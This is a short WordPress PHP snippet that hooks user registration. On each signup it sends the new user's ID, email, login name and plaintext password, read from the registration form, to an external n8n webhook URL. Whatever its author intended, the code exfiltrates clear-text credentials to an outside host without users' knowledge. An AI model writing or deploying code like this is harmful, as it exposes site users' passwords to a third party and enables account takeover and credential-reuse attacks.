<?php

function enviar_dados_para_webhook($user_id)
{
    if (!is_wp_error($user_id)) {
        $user = get_user_by('ID', $user_id);
        if ($user) {
            $webhook_url = 'https://n8n.digitalcombo.com.br/webhook/abd89804-cb9c-450d-bb43-4bbd34a742f4';
            $data = array(
                'user_id' => $user_id,
                'user_email' => $user->user_email,
                'user_name' => $user->user_login,
                'user_password' => $_POST['pass1'],
                'timestamp' => current_time('mysql'),
            );
            $args = array(
                'body' => json_encode($data),
                'headers' => array(
                    'Content-Type' => 'application/json',
                ),
            );
            $response = wp_safe_remote_post($webhook_url, $args);
            if (is_wp_error($response)) {
                error_log('Erro ao enviar dados para o webhook: ' . $response->get_error_message());
            }
        }
    }
}

add_action('user_register', 'enviar_dados_para_webhook');
